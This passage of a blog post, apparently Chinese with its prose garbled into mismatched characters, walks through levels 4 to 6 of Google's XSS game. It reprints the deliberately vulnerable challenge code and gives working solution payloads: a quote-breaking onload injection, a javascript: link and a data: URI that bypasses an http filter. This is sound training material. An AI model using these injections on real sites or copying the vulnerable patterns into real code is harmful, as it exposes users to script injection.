<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">startTimer</span>(<span style="color:#a6e22e">seconds</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">seconds</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">seconds</span>) <span style="color:#f92672">||</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>() { 
</span></span><span style="display:flex;"><span>          window.<span style="color:#a6e22e">confirm</span>(<span style="color:#e6db74">&#34;Time is up!&#34;</span>);
</span></span><span style="display:flex;"><span>          window.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">back</span>();
</span></span><span style="display:flex;"><span>        }, <span style="color:#a6e22e">seconds</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;level4&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/logos/level4.png&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/loading.gif&#34;</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;startTimer(&#39;{{ timer }}&#39;);&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;message&#34;</span>&gt;Your timer will execute in {{ timer }} seconds.&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>timerç»level.pyä¸­template.renderæ¸²æŸ“ï¼Œä¼šå¯¹æ¶æ„çš„XSSè¯­å¥è¿›è¡Œè½¬ä¹‰ï¼Œä¾‹å¦‚ä¼ å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;message&#34;</span>&gt;Your timer will execute in &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; seconds.&lt;/<span style="color:#f92672">div</span>&gt;
</span></span></code></pre></div><p>æ‰€ä»¥åªèƒ½è€ƒè™‘ä»ç¬¬ä¸€ä¸ªtimerè¿›è¡Œåˆ©ç”¨ï¼Œåœ¨ä¼ å…¥<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>æ—¶å‘ç°æ ¹æœ¬æ— æ³•è§¦å‘startTimerï¼Œæœªå‡ºç°confirmçš„å¼¹çª—ï¼Œè€ƒè™‘æ˜¯ä¼ å‚å¯èƒ½å‡ºäº†é—®é¢˜ã€‚</p>
<p>æŸ¥çœ‹Hint2ï¼Œå‘ç°æµè§ˆå™¨åœ¨è§£ææ ‡ç­¾attributeså±æ€§å€¼æ—¶ï¼Œä¼šå…ˆè¿›è¡ŒHTML-decodeï¼Œå› æ­¤å³ä½¿tempate.renderå¯¹ç‰¹æ®Šç¬¦å·è¿›è¡Œäº†ç¼–ç ï¼Œåœ¨è§£æonloadå±æ€§ä¸­çš„timeræ—¶ä»ç„¶ä¼šä»¥åŸå­—ç¬¦çš„å½¢å¼è§£æï¼Œæ‰€ä»¥ä¼ å…¥å•å¼•å·æ—¶æ— æ³•è§¦å‘å‡½æ•°</p>
<p>çŸ¥é“è¿™ä¸ªç‰¹æ€§åï¼Œåªéœ€é—­åˆå·¦è¾¹çš„<code>'(</code>å†è°ƒç”¨alertå³å¯å®ç°XSSï¼š</p>
<pre tabindex="0"><code>5&#39;);alert(&#39;XSS
</code></pre><hr>
<h3 id="level-5-breaking-protocol">Level 5: Breaking protocol<a hidden class="anchor" aria-hidden="true" href="#level-5-breaking-protocol">#</a></h3>
<p>level.pyï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainPage</span>(webapp<span style="color:#f92672">.</span>RequestHandler):
</span></span><span style="display:flex;"><span>Â Â <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render_template</span>(self, filename, context<span style="color:#f92672">=</span>{}):
</span></span><span style="display:flex;"><span>Â Â Â Â path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__), filename)
</span></span><span style="display:flex;"><span>Â Â Â Â self<span style="color:#f92672">.</span>response<span style="color:#f92672">.</span>out<span style="color:#f92672">.</span>write(template<span style="color:#f92672">.</span>render(path, context))
</span></span><span style="display:flex;"><span>Â 
</span></span><span style="display:flex;"><span>Â Â <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
</span></span><span style="display:flex;"><span>Â Â Â Â <span style="color:#75715e"># Disable the reflected XSS filter for demonstration purposes</span>
</span></span><span style="display:flex;"><span>Â Â Â Â self<span style="color:#f92672">.</span>response<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>add_header(<span style="color:#e6db74">&#34;X-XSS-Protection&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span>Â 
</span></span><span style="display:flex;"><span>Â Â Â Â <span style="color:#75715e"># Route the request to the appropriate template</span>
</span></span><span style="display:flex;"><span>Â Â Â Â <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;signup&#34;</span> <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>path:
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â self<span style="color:#f92672">.</span>render_template(<span style="color:#e6db74">&#39;signup.html&#39;</span>, 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â {<span style="color:#e6db74">&#39;next&#39;</span>: self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;next&#39;</span>)})
</span></span><span style="display:flex;"><span>Â Â Â Â <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;confirm&#34;</span> <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>path:
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â self<span style="color:#f92672">.</span>render_template(<span style="color:#e6db74">&#39;confirm.html&#39;</span>, 
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â Â Â {<span style="color:#e6db74">&#39;next&#39;</span>: self<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;next&#39;</span>, <span style="color:#e6db74">&#39;welcome&#39;</span>)})
</span></span><span style="display:flex;"><span>Â Â Â Â <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>Â Â Â Â Â Â self<span style="color:#f92672">.</span>render_template(<span style="color:#e6db74">&#39;welcome.html&#39;</span>, {})
</span></span><span style="display:flex;"><span>Â Â Â Â Â 
</span></span><span style="display:flex;"><span>Â Â Â Â <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>Â 
</span></span><span style="display:flex;"><span>application <span style="color:#f92672">=</span> webapp<span style="color:#f92672">.</span>WSGIApplication([ (<span style="color:#e6db74">&#39;.*&#39;</span>, MainPage), ], debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p>welcome.htmlï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;level5&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    Welcome! Today we are announcing the much anticipated&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/logos/level5.png&#34;</span> /&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/level5/frame/signup?next=confirm&#34;</span>&gt;Sign up&lt;/<span style="color:#f92672">a</span>&gt; 
</span></span><span style="display:flex;"><span>    for an exclusive Beta.
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>signup.htmlï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;level5&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/logos/level5.png&#34;</span> /&gt;&lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- We&#39;re ignoring the email, but the poor user will never know! --&gt;</span>
</span></span><span style="display:flex;"><span>    Enter email: &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;reader-email&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">br</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{ next }}&#34;</span>&gt;Next &gt;&gt;&lt;/<span style="color:#f92672">a</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>nextå€¼å¯æ§ï¼Œå°†hrefå±æ€§å€¼è®¾ä¸ºjavascriptä»£ç æ®µå³å¯å®ç°XSSï¼š</p>
<pre tabindex="0"><code>javascript:alert(&#39;XSS&#39;);
</code></pre><hr>
<h3 id="level-6-follow-the-">Level 6: Follow the ğŸ‡<a hidden class="anchor" aria-hidden="true" href="#level-6-follow-the-">#</a></h3>
<p>index.htmlï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setInnerText</span>(<span style="color:#a6e22e">element</span>, <span style="color:#a6e22e">value</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">innerText</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">includeGadget</span>(<span style="color:#a6e22e">url</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">scriptEl</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;script&#39;</span>);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// This will totally prevent us from loading evil URLs!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">/^https?:\/\//</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setInnerText</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;log&#34;</span>),
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Sorry, cannot load a URL containing \&#34;http\&#34;.&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Load this awesome gadget
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">scriptEl</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">url</span>;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Show log messages
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">scriptEl</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() { 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setInnerText</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;log&#34;</span>),  
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Loaded gadget from &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">url</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">scriptEl</span>.<span style="color:#a6e22e">onerror</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() { 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setInnerText</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;log&#34;</span>),  
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Couldn&#39;t load gadget from &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">url</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>      document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">scriptEl</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Take the value after # and use it as the gadget filename.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getGadgetName</span>() { 
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;/static/gadget.js&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">includeGadget</span>(<span style="color:#a6e22e">getGadgetName</span>());
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Extra code so that we can communicate with the parent page
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">source</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">parent</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">includeGadget</span>(<span style="color:#a6e22e">getGadgetName</span>());
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }, <span style="color:#66d9ef">false</span>);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;level6&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/logos/level6.png&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cube&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/level6_cube.png&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;log&#34;</span>&gt;Loading gadget...&lt;/<span style="color:#f92672">div</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>å®ç°äº†ä¸€ä¸ªä»å¤–éƒ¨åŠ è½½jsä»£ç å¹¶æ·»åŠ åˆ°headçš„åŠŸèƒ½ï¼Œè¦æ±‚location.hashä¸­ä¸åŒ…å«&quot;http&quot;å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨<a href="https://developer.mozilla.org/zh-CN/docs/Web/URI/Reference/Schemes/data">dataåè®®</a>ï¼š</p>
<pre tabindex="0"><code>https://xss-game.appspot.com/level6/frame#data:,alert(&#39;XSS&#39;);
</code></pre><hr>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
